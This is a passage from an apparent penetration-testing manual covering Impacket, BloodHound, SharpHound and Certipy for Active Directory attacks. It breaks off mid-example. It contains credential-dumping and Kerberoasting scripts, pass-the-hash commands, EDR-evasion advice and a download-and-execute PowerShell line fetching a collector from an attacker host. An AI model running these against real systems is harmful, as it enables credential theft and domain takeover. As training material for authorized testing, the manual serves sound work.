```bash
Type help for list of commands
# shares
NETLOGON
SYSVOL
C$
# use C$
# cd Users
# ls
drw-rw-rw-          0  Fri Jul 19 09:00:00 2026 Administrator
```

**Example 9 – Enumerating remote procedure call (RPC) endpoints**
```bash
$ rpcdump.py CORP/jdoe:'Autumn2024!'@10.10.10.5 | grep -A2 "Provider"
Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol
Provider: SAMSRV.dll
UUID: 12345778-1234-abcd-ef00-0123456789ac
```

**Example 10 – SID lookups/user enumeration with lookupsid.py**
```bash
$ lookupsid.py CORP/jdoe:'Autumn2024!'@10.10.10.5
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333
500: CORP\Administrator (SidTypeUser)
501: CORP\Guest (SidTypeUser)
512: CORP\Domain Admins (SidTypeGroup)
```

#### 7. Common Use Cases

- Remote command execution against Windows hosts using valid credentials or NTLM hashes (psexec.py, wmiexec.py, smbexec.py, atexec.py).
- Credential extraction from SAM, LSA secrets, and NTDS.dit (secretsdump.py) — a core step in most internal AD assessments.
- Kerberos attack techniques: Kerberoasting (GetUserSPNs.py), AS-REP roasting (GetNPUsers.py), and ticket forging/manipulation (ticketer.py, getST.py) for privilege escalation and persistence testing.
- NTLM relay attacks (ntlmrelayx.py) to leverage captured authentication attempts (e.g., via Responder) against other hosts.
- Building custom offensive tooling — Impacket's Python classes are frequently imported directly into bespoke scripts for protocol-specific research.
- Underlying engine for higher-level tools like CrackMapExec/NetExec, so understanding Impacket helps troubleshoot and extend those tools.

#### 8. Automation with Bash

```bash
#!/bin/bash
# impacket_ad_dump.sh - Automate common Impacket credential-gathering steps

DOMAIN="corp.local"
DC_IP="10.10.10.5"
USER="jdoe"
PASS="Autumn2024!"
OUTDIR="./impacket_results"
mkdir -p "$OUTDIR"

echo "[*] Kerberoasting..."
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile "$OUTDIR/kerberoast.txt"

echo "[*] AS-REP roasting..."
GetNPUsers.py "$DOMAIN/" -usersfile users.txt -dc-ip "$DC_IP" -format hashcat -outputfile "$OUTDIR/asrep.txt"

echo "[*] RPC endpoint enumeration..."
rpcdump.py "$DOMAIN/$USER:$PASS@$DC_IP" > "$OUTDIR/rpcdump.txt"

echo "[*] Done. Results under $OUTDIR"
```

```bash
#!/bin/bash
# impacket_secretsdump_sweep.sh - Run secretsdump.py against a list of admin-accessible hosts

HOSTS_FILE="admin_hosts.txt"
DOMAIN="CORP"
USER="administrator"
PASS="P@ssw0rd!"
OUTDIR="./dumps"
mkdir -p "$OUTDIR"

while IFS= read -r host; do
  echo "=== Dumping $host ==="
  secretsdump.py "$DOMAIN/$USER:$PASS@$host" -outputfile "$OUTDIR/${host}_dump"
done < "$HOSTS_FILE"
```

#### 9. Tips and Best Practices

- Use `-hashes` for pass-the-hash whenever you already have NTLM hashes, avoiding the need to crack passwords first.
- Prefer `wmiexec.py` for stealthier command execution (no service creation, unlike psexec.py) when OPSEC/detection avoidance matters within the agreed rules of engagement.
- Always run `secretsdump.py -just-dc` against a domain controller instead of a full `-ntds` dump when you only need user hashes, since it's faster and less resource-intensive on the DC.
- Combine `GetUserSPNs.py`/`GetNPUsers.py` output directly with Hashcat/John the Ripper (`-format hashcat`) for offline cracking.
- When using `ticketer.py`/`getST.py` for forged/delegated tickets, set `KRB5CCNAME` to the generated `.ccache` file and use `export KRB5CCNAME=ticket.ccache` before using `-k` with other Impacket scripts.
- Keep Impacket updated via pip, since Microsoft patches and protocol changes (e.g., relay mitigations, PAC validation) are addressed in newer releases.

#### 10. Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| `STATUS_ACCESS_DENIED` on psexec.py/wmiexec.py | Account lacks admin rights on target, or UAC remote restrictions | Verify local admin/Domain Admin equivalence; check `LocalAccountTokenFilterPolicy` registry setting for local accounts |
| `secretsdump.py -ntds` extremely slow | Full DRSUAPI replication on a large domain | Use `-just-dc-user <user>` to target a specific account, or use `-use-vss` |
| Kerberos errors ("Clock skew too great") | Time not synced between attacking host and DC | `sudo ntpdate <dc-ip>` or configure `chrony` |
| `ntlmrelayx.py` receives connections but relay fails | Target enforces SMB signing | Target hosts without signing enforced, or pivot to another relay-able protocol (LDAP/HTTP) |
| Ticket (`ticketer.py`) not accepted by target | Wrong domain SID, mismatched encryption type, or clock skew | Double-check domain SID accuracy and sync system time |

#### 11. References

- GitHub repository: https://github.com/fortra/impacket
- Official Fortra Impacket page: https://www.fortra.com/open-source-tools/impacket
- Kali Linux tool page: https://www.kali.org/tools/impacket-scripts/
- Example script documentation: https://github.com/fortra/impacket/tree/master/examples

## Chapter 15 – Active Directory

Active Directory (AD) is the identity and access management backbone of the vast majority of enterprise Windows networks. It centralizes authentication (Kerberos, NTLM), authorization (Group Policy, ACLs), and directory services (LDAP) for users, computers, groups, and trusts across a domain or forest. Because AD sits at the center of nearly every corporate network, it is also one of the highest-value targets during a penetration test or red team engagement — compromising a single low-privileged domain user often leads, through a chain of misconfigurations, excessive permissions, and trust relationships, all the way to Domain Admin or Enterprise Admin.

### 15.1 BloodHound

#### 1. Tool Introduction

BloodHound is a graph-analysis application used to reveal hidden and often unintended relationships within an Active Directory (or Azure AD/Entra ID) environment. It ingests data collected by a companion "ingestor" (usually **SharpHound**, see 15.2, or **AzureHound** for cloud) and loads it into a graph database (Neo4j). Analysts can then run pre-built or custom Cypher queries to instantly identify attack paths — for example, "show me the shortest path from any Domain User to Domain Admin."

BloodHound models AD objects (users, groups, computers, GPOs, OUs, domains) as **nodes** and relationships (`MemberOf`, `AdminTo`, `HasSession`, `GenericAll`, `ForceChangePassword`, `CanRDP`, etc.) as **edges**. This makes it trivial to spot excessive nested group memberships, dangerous ACLs, Kerberoastable accounts, unconstrained delegation, and more — all of which are extremely difficult to identify manually via `net` commands or PowerShell alone.

There are two major branches in active use:
- **BloodHound Legacy (BloodHound GUI, Neo4j + Electron app)** – the original open-source community edition.
- **BloodHound Community Edition (BHCE)** – the modern, Docker-based, web-UI rewrite (Postgres + Neo4j + API), maintained by SpecterOps, which replaces the legacy Electron app.

This chapter documents both, with emphasis on BHCE since it is the actively maintained version shipped in current Kali releases.

#### 2. How to Install

##### 2.1 Kali Linux (pre-installed / apt)

```bash
# Update package lists
sudo apt update

# Install BloodHound Community Edition (Kali 2023.4+ ships bloodhound-cli)
sudo apt install bloodhound bloodhound-cli -y

# Verify
bloodhound-cli --version
```

##### 2.2 BloodHound Community Edition via Docker (recommended, cross-distro)

```bash
# Install Docker & docker-compose if not already installed
sudo apt install docker.io docker-compose -y

# Download the official quickstart compose file
curl -L https://ghst.ly/getbhce -o docker-compose.yml

# Launch the stack (Neo4j, Postgres, API, Web UI)
sudo docker compose up -d

# The first-run random admin password is printed in the logs:
sudo docker compose logs bloodhound | grep -i "initial password"
```

##### 2.3 Legacy BloodHound (Neo4j + Electron GUI)

```bash
# Install Neo4j (Java-based graph DB)
sudo apt install neo4j -y

# Start Neo4j console
sudo neo4j console
# Browse to http://localhost:7474 and set the initial password (default neo4j/neo4j)

# Install legacy BloodHound GUI
sudo apt install bloodhound -y
bloodhound --no-sandbox
```

#### 3. Syntax

BloodHound itself (the analysis GUI/web app) is not driven by CLI flags for analysis — it is a graphical/web interface. The CLI surface area belongs to `bloodhound-cli` (BHCE lifecycle management) and to Cypher queries typed into the built-in query editor.

```bash
bloodhound-cli [command] [flags]
```

For the legacy Electron client:

```bash
bloodhound [options]
```

#### 4. Command-Line Options

**bloodhound-cli (BHCE management):**

| Command | Description |
|---|---|
| `bloodhound-cli install` | Install/initialize the BHCE Docker stack |
| `bloodhound-cli start` | Start all BHCE containers |
| `bloodhound-cli stop` | Stop all BHCE containers |
| `bloodhound-cli config` | View/edit BHCE configuration |
| `bloodhound-cli --version` | Print version info |

**Legacy BloodHound Electron app flags:**

| Flag | Description |
|---|---|
| `--no-sandbox` | Run without Chromium sandbox (required in many containers/root shells) |
| `--debug` | Enable verbose debug logging |

**Common Cypher queries used inside the BloodHound query editor:**

| Query Purpose | Cypher |
|---|---|
| Find all Domain Admins | `MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN u` |
| Shortest path to Domain Admins | Built-in analysis tab: "Shortest Paths to Domain Admins" |
| Find Kerberoastable users | `MATCH (u:User {hasspn:true}) RETURN u.name` |
| Find users with DCSync rights | `MATCH (u:User)-[:MemberOf|GetChanges*1..]->(d:Domain) RETURN u` |
| Find unconstrained delegation hosts | `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name` |

#### 5. Basic Usage (Expected Output in Bash)

```bash
$ sudo docker compose up -d
[+] Running 5/5
 ✔ Container bloodhound-db-1        Started
 ✔ Container bloodhound-graph-db-1  Started
 ✔ Container bloodhound-app-db-1    Started
 ✔ Container bloodhound-bloodhound-1 Started
 ✔ Network bloodhound_default        Created

$ sudo docker compose logs bloodhound | grep -i "initial password"
bloodhound-1  | 2026-07-19T10:02:11Z INFO  Initial Password Set To:  aB3$kLp9zXq1  This password will not be displayed again.
```

Browse to `http://localhost:8080`, log in with `admin` / the printed password, and you'll land on the empty graph dashboard ready for data upload.

#### 6. Practical Examples (with Output)

**Example 1 – Start BHCE stack**
```bash
$ sudo docker compose up -d
[+] Running 5/5 containers started
```

**Example 2 – Check running containers**
```bash
$ sudo docker ps
CONTAINER ID   IMAGE                              STATUS         PORTS
3f1a2b9c9d11   specterops/bloodhound:latest       Up 2 minutes   0.0.0.0:8080->8080/tcp
7e2d4f8a1c22   docker.io/library/postgres:13      Up 2 minutes   5432/tcp
9a1b2c3d4e55   docker.io/library/neo4j:4.4        Up 2 minutes   7474/tcp, 7687/tcp
```

**Example 3 – Upload SharpHound zip via web UI**
```
File Ingest -> Upload Files -> select 20260719123456_BloodHound.zip -> Upload
Status: Processing... Done (1 file, 4,532 nodes, 18,204 edges ingested)
```

**Example 4 – Run "Find all Domain Admins" pre-built query**
```
Analysis tab -> "Find all Domain Admins"
Result: 3 nodes returned
 - ADMINISTRATOR@CORP.LOCAL
 - SVC-BACKUP@CORP.LOCAL
 - J.SMITH@CORP.LOCAL
```

**Example 5 – Shortest path from Owned users to Domain Admins**
```
Mark WEB01$@CORP.LOCAL as "Owned" (right-click -> Mark as Owned)
Analysis tab -> "Shortest Paths from Owned Objects"
Result: WEB01$ -[AdminTo]-> WKST23$ -[HasSession]-> J.SMITH -[MemberOf]-> DOMAIN ADMINS
```

**Example 6 – Custom Cypher: find Kerberoastable accounts**
```
Cypher query bar:
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'KRBTGT' RETURN u.name, u.pwdlastset

Results (table view):
u.name                    u.pwdlastset
SVC-SQL@CORP.LOCAL         2022-01-04T11:12:03Z
SVC-WEB@CORP.LOCAL         2023-06-19T09:44:51Z
```

**Example 7 – Find computers with unconstrained delegation**
```
Cypher: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
Results:
c.name
DC01.CORP.LOCAL
FILESRV01.CORP.LOCAL
```

**Example 8 – Find ACL abuse paths (GenericAll on GPO)**
```
Cypher: MATCH p=(u:User)-[:GenericAll]->(g:GPO) RETURN p
Result: 1 path found
HELPDESK_USER@CORP.LOCAL -[GenericAll]-> "Default Domain Policy"@CORP.LOCAL
```

**Example 9 – Export a session graph as image**
```
Right-click graph canvas -> Export -> PNG
Saved: attack-path-2026-07-19.png
```

**Example 10 – Mark high-value targets and re-run analysis**
```
Right-click DC01.CORP.LOCAL -> Mark as High Value Target
Analysis tab -> "Shortest Paths to High Value Targets"
Result: 2 distinct paths rendered, 5 hops max
```

#### 7. Common Use Cases

- Visualizing and prioritizing privilege escalation paths after an initial low-priv foothold.
- Identifying Kerberoasting/ASREPRoasting targets at scale.
- Mapping ACL/DACL misconfigurations (GenericAll, WriteDACL, ForceChangePassword, AddMember).
- Discovering unconstrained/constrained/RBCD delegation abuse opportunities.
- Session hunting — determining which hosts a privileged user is logged into (`HasSession` edges).
- Post-engagement reporting — exporting attack path graphics for the client report.
- Blue team use — identifying and remediating dangerous attack paths proactively ("purple teaming").

#### 8. Automation with Bash

```bash
#!/bin/bash
# bhce-bootstrap.sh - spin up BHCE and auto-grab the initial password

set -euo pipefail

echo "[*] Downloading BHCE docker-compose.yml"
curl -sL https://ghst.ly/getbhce -o docker-compose.yml

echo "[*] Starting BloodHound CE stack"
sudo docker compose up -d

echo "[*] Waiting for services to initialize..."
sleep 15

echo "[*] Initial admin credentials:"
sudo docker compose logs bloodhound | grep -i "initial password" || \
  echo "[-] Password not found yet, check logs again in a few seconds"

echo "[*] Web UI available at: http://localhost:8080"
```

```bash
#!/bin/bash
# bhce-ingest.sh - watch a directory and auto-upload SharpHound zips via API

API_URL="http://localhost:8080/api/v2"
TOKEN="$1"   # pass a valid BHCE API JWT
WATCH_DIR="./sharphound-out"

inotifywait -m -e close_write "$WATCH_DIR" --format '%f' | while read -r FILE; do
  echo "[*] New file detected: $FILE, uploading..."
  curl -s -X POST "$API_URL/file-upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@${WATCH_DIR}/${FILE}"
done
```

#### 9. Tips and Best Practices

- Always collect data with the **matching version** of SharpHound/AzureHound for your BloodHound version — schema mismatches cause silent ingestion errors.
- Mark your compromised principals as **"Owned"** as you go; this keeps "Shortest Path from Owned" queries accurate and saves huge amounts of manual graph-hunting.
- Use **High Value Targets** tagging on top of the defaults (DA, EA, DC computers) to include business-critical assets (e.g., a CI/CD service account).
- For large environments (100k+ objects), increase Neo4j's heap size (`dbms.memory.heap.max_size`) to avoid OOM crashes during ingestion.
- Combine BloodHound with **Cypher custom queries** from the community (e.g., the `hausec` or `CompassSecurity` custom-queries.json) for ADCS (ESC edges), MSSQL links, and RBCD-specific paths.
- Re-collect data periodically during long engagements — AD state changes, and stale sessions/ACLs will mislead your path analysis.
- Never run BloodHound ingestors on production DCs without client sign-off — SharpHound's LDAP/SMB queries can be noisy and trigger EDR/SIEM alerts.

#### 10. Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| Web UI stuck on "Loading" | Neo4j/Postgres containers not fully healthy | `docker compose ps`, check `docker compose logs graph-db` |
| Upload fails with "Invalid schema version" | SharpHound version mismatch | Use SharpHound version matching your BHCE release notes |
| Electron GUI crashes on launch | Missing sandbox permissions in container/root | Launch with `bloodhound --no-sandbox` |
| Neo4j refuses connection on 7687 | Neo4j not started / wrong bolt password | `sudo neo4j console`, reset password via `neo4j-admin set-initial-password` |
| Graph extremely slow with large datasets | Insufficient Neo4j heap/pagecache | Edit `neo4j.conf`: increase `dbms.memory.heap.max_size` and `dbms.memory.pagecache.size` |
| "Initial password" never appears in logs | Container restarted after first init | Reset via `docker compose exec app bloodhound-cli config` (BHCE) or reinstall stack |

#### 11. References

- Official BloodHound documentation: https://bloodhound.specterops.io/
- BloodHound Community Edition GitHub: https://github.com/SpecterOps/BloodHound
- BloodHound Legacy GitHub (archived): https://github.com/BloodHoundAD/BloodHound
- SpecterOps blog (attack path research): https://posts.specterops.io/
- Kali Linux tool listing: https://www.kali.org/tools/bloodhound/


### 15.2 SharpHound

#### 1. Tool Introduction

SharpHound is the official data collector ("ingestor") for BloodHound. Written in C#, it runs on a Windows host (physical, VM, or a compromised domain-joined machine) and enumerates Active Directory via LDAP and SMB/RPC calls to gather the objects and relationships that BloodHound visualizes: users, groups, computers, GPOs, OUs, trusts, sessions, local admin rights, and ACLs. The output is a set of JSON files bundled into a timestamped `.zip` archive, ready for upload into BloodHound.

SharpHound ships in several forms:
- **SharpHound.exe** – standalone compiled binary.
- **SharpHound.ps1** – PowerShell wrapper (reflectively loads the C# assembly in-memory, useful for AV/EDR evasion during authorized engagements).
- **BloodHound.py** – a Python re-implementation (Impacket-based) that can be run from Linux/Kali directly against a domain without needing a Windows foothold, provided you have valid domain credentials.

This section documents the official C#/PowerShell SharpHound as well as the Linux-native BloodHound.py collector, both commonly used from Kali.

#### 2. How to Install

##### 2.1 SharpHound.exe / .ps1 (Windows collector)

```bash
# On Kali, download the latest release to serve/transfer to target
git clone https://github.com/BloodHoundAD/SharpHound.git
cd SharpHound

# Or grab prebuilt binaries from the BloodHound CE releases page
wget https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound-v2.5.9.zip
unzip SharpHound-v2.5.9.zip -d sharphound-bin
```

Transfer `SharpHound.exe` or `SharpHound.ps1` to the target Windows host (via SMB share, Evil-WinRM upload, HTTP server, etc.).

##### 2.2 BloodHound.py (Kali, Linux-native, no Windows foothold needed)

```bash
# Kali often ships it already
sudo apt install bloodhound.py -y

# Or install via pipx (recommended for latest version)
sudo apt install pipx -y
pipx install bloodhound.py

# Verify
bloodhound-python --version
```

#### 3. Syntax

**SharpHound.exe:**
```
SharpHound.exe -c <CollectionMethod> [options]
```

**SharpHound.ps1:**
```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod <Method> [options]
```

**BloodHound.py (Kali/Linux):**
```bash
bloodhound-python -u <username> -p <password> -d <domain> -ns <dc_ip> -c <CollectionMethod>
```

#### 4. Command-Line Options

**SharpHound.exe key flags:**

| Flag | Description |
|---|---|
| `-c, --CollectionMethods` | Collection methods: `Default`, `All`, `DCOnly`, `Session`, `LoggedOn`, `Trusts`, `ACL`, `Container`, `RDP`, `ObjectProps`, `LocalAdmin`, `GPOLocalGroup`, `CertServices`, `LocalGroup` |
| `-d, --Domain` | Target domain FQDN |
| `--LdapUsername` / `--LdapPassword` | Alternate LDAP credentials |
| `-s, --Stealth` | Use stealth collection (lower noise, fewer methods) |
| `--OutputDirectory` | Directory to write ZIP output |
| `--OutputPrefix` | Prefix for output filenames |
| `--ZipFilename` | Custom name for the final zip |
| `-t, --DomainController` | Specify DC IP/hostname to query |
| `--Throttle` | Milliseconds to sleep between requests (throttling for OPSEC) |
| `--Jitter` | Percentage jitter added to throttle |
| `--ExcludeDCs` | Skip DC computers from computer-based collection |
| `--SearchForest` | Collect across the entire forest, not just current domain |
| `--LoopCollection` / `--Loop` | Loop session collection over a time window (for `HasSession` accuracy) |
| `--LoopDuration` | Total duration for loop collection |
| `--LoopInterval` | Interval between loop passes |
| `-v` | Verbosity level |

**BloodHound.py key flags:**

| Flag | Description |
|---|---|
| `-u` | Username |
| `-p` | Password (or NTLM hash with `-p` if `-k`/`--hashes` semantics apply) |
| `-d` | Domain |
| `-ns` | Nameserver / DC IP for DNS resolution |
| `-c` | Collection method (`Default`, `All`, `DCOnly`, `Group`, `LocalAdmin`, `Session`, `Trusts`, `ACL`, `ObjectProps`, `Container`, `RDP`, `DCOM`, `PSRemote`) |
| `-gc` | Global catalog server |
| `--zip` | Zip the output JSON automatically |
| `-k` | Use Kerberos authentication |
| `--hashes LM:NT` | Pass-the-hash authentication |
| `--dns-tcp` | Force DNS resolution over TCP |
| `-op, --outputdir` | Output directory |

#### 5. Basic Usage (Expected Output in Bash)

```bash
$ bloodhound-python -u j.smith -p 'P@ssw0rd123' -d corp.local -ns 10.10.10.10 -c All --zip
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 543 users
INFO: Found 89 groups
INFO: Found 112 computers
INFO: Found 12 gpos
INFO: Found 34 ous
INFO: Found 1 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WKST01.corp.local
INFO: Compressing output into 20260719101532_bloodhound.zip
```

#### 6. Practical Examples (with Output)

**Example 1 – Default collection with domain credentials (BloodHound.py)**
```bash
$ bloodhound-python -u j.smith -p 'P@ssw0rd123' -d corp.local -ns 10.10.10.10 -c Default
INFO: Found AD domain: corp.local
INFO: Found 543 users, 89 groups, 112 computers
INFO: Done in 00M 42S
```

**Example 2 – Pass-the-hash collection**
```bash
$ bloodhound-python -u j.smith --hashes :b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6 -d corp.local -ns 10.10.10.10 -c All
INFO: Found AD domain: corp.local
INFO: Compressing output into 20260719102201_bloodhound.zip
```

**Example 3 – DCOnly collection (stealthiest, LDAP only, no computer touches)**
```bash
$ bloodhound-python -u j.smith -p 'P@ssw0rd123' -d corp.local -ns 10.10.10.10 -c DCOnly
INFO: Found AD domain: corp.local
INFO: DCOnly collection selected, skipping computer enumeration
INFO: Compressing output into 20260719102910_bloodhound.zip
```

**Example 4 – SharpHound.exe run on a compromised Windows host (via Evil-WinRM)**
```
*Evil-WinRM* PS C:\Users\Public> .\SharpHound.exe -c All --OutputDirectory C:\Users\Public\out
2026-07-19T10:31:02 [+] Initializing SharpHound at 10:31 AM on 7/19/2026
2026-07-19T10:31:02 [+] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, ...
2026-07-19T10:31:03 [+] Beginning LDAP Enumeration
2026-07-19T10:33:41 [+] Status: 4,532 objects finished (+4532 4.5/s) -- Using 20 MB RAM
2026-07-19T10:33:41 [+] Enumeration finished
2026-07-19T10:33:41 [+] SharpHound Enumeration Completed at 10:33 AM
```

**Example 5 – Stealth collection to reduce noise**
```bash
*Evil-WinRM* PS C:\> .\SharpHound.exe -c All -s
[+] Stealth collection selected, session collection restricted to DC event logs
```

**Example 6 – SharpHound.ps1 reflective load (in-memory, no exe on disk)**
```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/SharpHound.ps1')
PS C:\> Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName loot.zip
[+] Initializing SharpHound
[+] Enumeration finished, wrote to loot.zip
```

**Example 7 – Loop session collection for HasSession accuracy**
```bash
*Evil-WinRM* PS C:\> .\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
[+] Looping enumeration, 24 iterations planned over 2 hours
[+] Iteration 1/24 completed
```

**Example 8 – Collect ADCS data for Certipy/BloodHound ESC edges**
```bash
$ bloodhound-python -u j.smith -p 'P@ssw0rd123' -d corp.local -ns 10.10.10.10 -c CertServices
INFO: Found 2 certificate templates, 1 enrollment services
INFO: Compressing output into 20260719104412_bloodhound.zip
```

**Example 9 – Collect using Kerberos ticket (ccache) instead of password**
```bash
$ export KRB5CCNAME=/tmp/jsmith.ccache
$ bloodhound-python -u j.smith -d corp.local -ns 10.10.10.10 -c All -k --no-pass
INFO: Using Kerberos Cache: /tmp/jsmith.ccache
INFO: Compressing output into 20260719105501_bloodhound.zip
```

**Example 10 – Forest-wide collection across trusts**
```bash
*Evil-WinRM* PS C:\> .\SharpHound.exe -c All --SearchForest
[+] Search forest specified, targeting all domains in the forest
[+] Found domains: corp.local, child.corp.local
```

#### 7. Common Use Cases

- Initial AD data collection right after obtaining any valid domain credential (even low-priv).
- Session hunting to find where high-privilege accounts are currently logged in.
- Collecting ADCS template/enrollment data (`CertServices`) to feed Certipy/BloodHound ESC analysis.
- Low-noise `DCOnly` LDAP-only sweeps when OPSEC/stealth matters most.
- Continuous/looped collection during long engagements for more accurate session graphs.
- Cross-forest collection when a trust relationship exists.

#### 8. Automation with Bash

```bash
#!/bin/bash
# sharphound-collect.sh - automate BloodHound.py collection and organize output

set -euo pipefail

USER="$1"
PASS="$2"
DOMAIN="$3"
DC_IP="$4"
OUTDIR="./bh_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTDIR"
echo "[*] Running full BloodHound.py collection against $DOMAIN"

bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" \
  -c All --zip -op "$OUTDIR"

ZIPFILE=$(ls "$OUTDIR"/*.zip | head -n1)
echo "[+] Collection complete: $ZIPFILE"
echo "[*] Ready to upload to BloodHound CE at http://localhost:8080"
```

```bash
#!/bin/bash
# multi-user-collect.sh - collect with a list of credentials (e.g. after password spray)

while IFS=: read -r USER PASS; do
  echo "[*] Trying collection as $USER"
  bloodhound-python -u "$USER" -p "$PASS" -d corp.local -ns 10.10.10.10 -c All --zip \
    -op "./bh_${USER}" 2>&1 | tee "./bh_${USER}.log"
done < creds.txt
```

#### 9. Tips and Best Practices

- Use `DCOnly` when you want zero touch on member computers — it pulls sessions from DC security event logs instead, which is far less noisy.
- Always `--zip` your output; BloodHound CE expects a zip (or individual JSONs) — raw unzipped folders from older versions can confuse ingestion.
- Match SharpHound's version to your BloodHound version; the JSON schema changes between major releases.
- On Windows targets with EDR, prefer the PowerShell in-memory reflective load over dropping `SharpHound.exe` to disk, and rename functions/variables if signature-based detection is a concern (only within authorized red-team engagements).
- Use `--Throttle` and `--Jitter` to slow down collection and blend in with normal LDAP/SMB traffic on sensitive engagements.
- Run `CertServices` collection whenever ADCS is present in the environment — it unlocks ESC1–ESC8 edge detection in BloodHound.
- Loop `Session` collection over hours, not minutes — session data is a snapshot and stale within minutes on busy networks.

#### 10. Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| `Could not find LDAP` / connection refused | Wrong DC IP or firewall blocking 389/636 | Verify with `nmap -p389,636 <dc_ip>`, confirm DNS resolves domain |
| `KRB5KDC_ERR_PREAUTH_FAILED` | Bad credentials or clock skew | Verify creds; sync clock: `sudo ntpdate <dc_ip>` |
| Zero computers collected | Account lacks read rights on target OUs, or WinRM/SMB blocked | Try `DCOnly` first; check firewall rules to member servers |
| SharpHound.exe flagged/blocked by AV/EDR | Signature detection | Use `SharpHound.ps1` reflective load, obfuscate strings (authorized engagements only) |
| Ingestion into BloodHound fails ("invalid zip") | Corrupted transfer or version mismatch | Re-download output, verify SharpHound/BloodHound version compatibility |
| `dns-tcp` resolution errors | UDP DNS blocked on network | Add `--dns-tcp` to bloodhound-python |

#### 11. References

- SharpHound GitHub: https://github.com/BloodHoundAD/SharpHound
- SharpHound CE GitHub (SpecterOps): https://github.com/SpecterOps/SharpHound
- BloodHound.py (Impacket-based) GitHub: https://github.com/dirkjanm/BloodHound.py
- Official collection methods reference: https://bloodhound.specterops.io/collect-data/collection-methods
- Kali Linux tool listing: https://www.kali.org/tools/bloodhound-py/

### 15.3 Certipy

#### 1. Tool Introduction

Certipy is a Python offensive toolkit for enumerating and abusing misconfigurations in Active Directory Certificate Services (AD CS). AD CS is Microsoft's PKI role, and when misconfigured it opens a family of well-documented privilege-escalation and persistence primitives cataloged by the "Certified Pre-Owned" research (SpecterOps) as ESC1 through ESC16 (Escalation Scenarios). Certipy can enumerate Certificate Authorities and templates, identify which ESC vulnerabilities apply, request certificates abusing those vulnerabilities, and use the resulting certificates to authenticate via PKINIT (obtaining a TGT) or to extract NTLM hashes via the `UnPAC-the-hash` technique. It effectively replaced/extended the older `Certify.exe` (C#/Windows-only) with a fully cross-platform, Linux-native implementation.

#### 2. How to Install

```bash
# Kali Linux (usually pre-installed)
sudo apt update
sudo apt install certipy-ad -y

# Or install the latest via pipx
sudo apt install pipx -y
pipx install certipy-ad

# Verify
certipy-ad --version
```

```bash
# From source (latest development version)
git clone https://github.com/ly4k/Certipy.git
cd Certipy
python3 -m pip install .
```

#### 3. Syntax

```bash
certipy-ad <command> [options]
```

Main commands: `find`, `req`, `auth`, `account`, `ca`, `template`, `cert`, `forge`, `relay`, `shadow`, `ptt`, `vuln`.

#### 4. Command-Line Options

**`certipy-ad find` (enumeration):**

| Flag | Description |
|---|---|
| `-u` | Username (`user@domain.com` format) |
| `-p` | Password |
| `-hashes LM:NT` | Pass-the-hash |
| `-k` | Kerberos authentication |
| `-dc-ip` | Domain controller IP |
| `-vulnerable` | Only show templates with known vulnerabilities |
| `-enabled` | Only show enabled templates |
| `-json` | Output as JSON (for BloodHound-style further parsing) |
| `-old-bloodhound` | Output in legacy BloodHound-compatible format |
| `-bloodhound` | Output data compatible with BloodHound CE ingestion |
| `-stdout` | Print results to stdout instead of file |
| `-text` | Save output as human-readable text |

**`certipy-ad req` (request a certificate):**

| Flag | Description |
|---|---|
| `-ca` | Target Certificate Authority name |
| `-template` | Certificate template name |
| `-upn` | UPN to request certificate for (ESC1) |
| `-sid` | Object SID to embed (ESC1/SID abuse) |
| `-on-behalf-of` | Enrollment agent abuse target (ESC3) |
| `-pfx` | Output PFX certificate file |
| `-key-size` | RSA key size for generated CSR |

**`certipy-ad auth` (authenticate with certificate / PKINIT):**

| Flag | Description |
|---|---|
| `-pfx` | Path to PFX certificate |
| `-username` | Target username |
| `-domain` | Target domain |
| `-dc-ip` | DC IP |
| `-no-hash` | Skip NTLM hash retrieval (UnPAC-the-hash) |

**`certipy-ad shadow` (Shadow Credentials / ESC-style `msDS-KeyCredentialLink` abuse):**

| Flag | Description |
|---|---|
| `add` | Add a key credential to target account |
| `list` | List existing key credentials |
| `remove` | Remove a key credential |
| `-account` | Target account name |

**`certipy-ad relay`:**

| Flag | Description |
|---|---|
| `-ca` | CA to relay certificate requests to (ESC8, NTLM relay to HTTP enrollment) |
| `-template` | Template to request during relay |

#### 5. Basic Usage (Expected Output in Bash)

```bash
$ certipy-ad find -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 1 enabled certificate templates
[*] Trying to get CA configuration for 'CORP-CA' via CSRA
[*] Successfully retrieved CA configuration
[*] Checking for ESC1
[!] Vulnerabilities found:
    ESC1     : 'CORP\\Domain Users' can enroll and specify arbitrary SAN in template 'VulnTemplate'
[*] Saving text output to '20260719103322_Certipy.txt'
[*] Saving JSON output to '20260719103322_Certipy.json'
```

#### 6. Practical Examples (with Output)

**Example 1 – Full enumeration**
```bash
$ certipy-ad find -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10
